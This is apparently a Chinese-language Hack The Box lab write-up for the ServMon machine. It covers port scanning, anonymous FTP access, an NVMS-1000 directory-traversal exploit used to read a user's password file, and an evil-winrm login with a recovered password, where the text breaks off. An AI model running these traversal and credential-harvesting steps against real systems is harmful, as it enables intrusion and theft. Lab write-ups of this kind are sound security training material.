# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责。

# 服务探测
```
┌──(root💀kali)-[~/htb/ServMon]
└─# nmap -sV -Pn 10.10.10.184 -p- 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-06 04:37 EST
Nmap scan report for 10.10.10.184
Host is up (0.34s latency).
Not shown: 991 closed ports
PORT     STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
80/tcp    open  http
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
5666/tcp  open  tcpwrapped
6063/tcp  open  x11?
6699/tcp  open  napster?
8443/tcp  open  ssl/https-alt
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC


```

开启了很多服务，ftp，ssh，http，smb等等，一个个看。

80端口打开跳转到一个nvms的登录页面，登录账号未知

测试发现ftp可以匿名登录，那就先从ftp开始


## ftp匿名登录
```
┌──(root💀kali)-[~/htb/ServMon]
└─# ftp 10.10.10.184
Connected to 10.10.10.184.
220 Microsoft FTP Service
Name (10.10.10.184:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
01-18-20  11:05AM       <DIR>          Users
226 Transfer complete.
ftp> cd Uswes
550 The system cannot find the file specified. 
ftp> cd Users
250 CWD command successful.
ftp> ls -alh
200 PORT command successful.
125 Data connection already open; Transfer starting.
01-18-20  11:06AM       <DIR>          Nadine
01-18-20  11:08AM       <DIR>          Nathan

```

进去是一个Users文件夹，二级目录下有两个用户文件夹```Nadine```和```Nathan```，不错，得到两个用户名
把```Nadine/Confidential.txt```和```Nathan/Notes to do.txt```下载到本地分析


查看这两个文件
```
──(root💀kali)-[~/htb/ServMon]
└─# cat Confidential.txt 
Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards

Nadine                                                                                                                                                                                                                                            
┌──(root💀kali)-[~/htb/ServMon]
└─# cat 'Notes to do.txt'

1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint   
```

有点CTF的意思了。。。

根据提示有一个secure folder存放了Nathan修改后的password，这个密码可以用来登录NVMS后台
Nathan的桌面上有一个Passwords.txt文件


## 目录遍历
80端口的cms叫做```NVMS-10000```，经查看存在一个目录遍历漏洞

我在github上找到了[这个](https://github.com/AleDiBen/NVMS1000-Exploit)漏洞编号为``` CVE - 2019-20085```的exp

尝试读取```Windows/system.ini```文件

```
┌──(root💀kali)-[~/htb/ServMon]
└─# ./nvms.py 10.10.10.184 Windows/system.ini win.ini
[+] DT Attack Succeeded
[+] Saving File Content
[+] Saved
[+] File Content

++++++++++ BEGIN ++++++++++
; for 16-bit app support                                                                                                                                                                                                                    
[386Enh]                                                                                                  
woafont=dosapp.fon                                                                                            
EGA80WOA.FON=EGA80WOA.FON                                                                                           
EGA40WOA.FON=EGA40WOA.FON                                                                                            
CGA80WOA.FON=CGA80WOA.FON                                                                                            
CGA40WOA.FON=CGA40WOA.FON    
[drivers]                                                                                                          
wave=mmdrv.dll                                                                                                        
timer=timer.drv                                                                                                  
[mci]                                                                                                                                                                                                                                   
++++++++++  END  ++++++++++     
```

成功读取，现在读取Nathan桌面下的Passwords.txt
```
┌──(root💀kali)-[~/htb/ServMon]
└─# ./nvms.py 10.10.10.184 users/Nathan/Desktop/Passwords.txt Passwords.txt
[+] DT Attack Succeeded
[+] Saving File Content
[+] Saved
[+] File Content

++++++++++ BEGIN ++++++++++
1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$
                                                                                           
++++++++++  END  ++++++++++  
```

现在我们找到了一个密码字典，根据ftp的提示，其中一个是

evil-winrm -u 'nathan' -p '1nsp3ctTh3Way2Mars!' -i 10.10.10.184